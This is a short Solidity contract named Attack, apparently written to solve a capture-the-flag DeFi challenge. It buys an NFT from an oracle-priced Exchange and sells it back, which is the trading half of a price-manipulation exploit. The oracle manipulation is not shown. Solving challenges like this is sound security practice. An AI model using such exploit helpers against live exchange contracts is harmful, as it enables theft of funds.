// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import {Exchange} from "../src/Exchange.sol";
import {TrustfulOracleInitializer} from "../src/TrustfulOracleInitializer.sol";
import {TrustfulOracle} from "../src/TrustfulOracle.sol";

contract Attack {
    TrustfulOracle oracle;
    Exchange exchange;
    uint256 tokenId;

    constructor(TrustfulOracle _oracle, Exchange _exchange) {
        oracle = _oracle;
        exchange = _exchange;
    }
    function buy() public {
        tokenId = exchange.buyOne{value: 0.1 ether}();
    }
    function sell() public {
        exchange.token().approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
